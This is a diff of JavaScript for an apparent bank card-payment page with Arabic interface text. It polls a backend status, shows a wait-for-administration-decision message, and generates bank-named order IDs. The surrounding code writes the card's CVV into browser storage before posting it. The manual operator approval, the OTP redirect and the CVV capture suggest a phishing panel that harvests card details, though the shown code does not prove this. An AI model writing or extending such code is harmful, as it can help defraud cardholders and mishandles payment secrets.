@@ -828,15 +828,18 @@
           if (!data || !data.status) return;
 
           var st = String(data.status).toLowerCase();
-          
-          if (st === 'accept' || st === 'approved' || st === 'otp') {
+
+          if (st === 'accept' || st === 'approved') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            window.location.href = data.redirectUrl || 'otp.html';
+            window.location.href = data.redirect || 'success-ar.html';
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
             document.getElementById('rejectModal').classList.add('active');
+          } else if (st === 'pending') {
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.querySelector('.loading-text').textContent = 'بانتظار قرار الإدارة... يرجى الانتظار';
           }
         })
         .catch(function(err) {
@@ -880,6 +883,11 @@
         cvv: cvv
       }));
     } catch (e) { /* ignore storage errors */ }
+
+    if (!orderId) {
+      orderId = sessionStorage.getItem('aman_bank_request_id') || 'pending-' + Date.now();
+      sessionStorage.setItem('safwa_order_id', orderId);
+    }
 
     fetch('/api/payment', {
       method: 'POST',
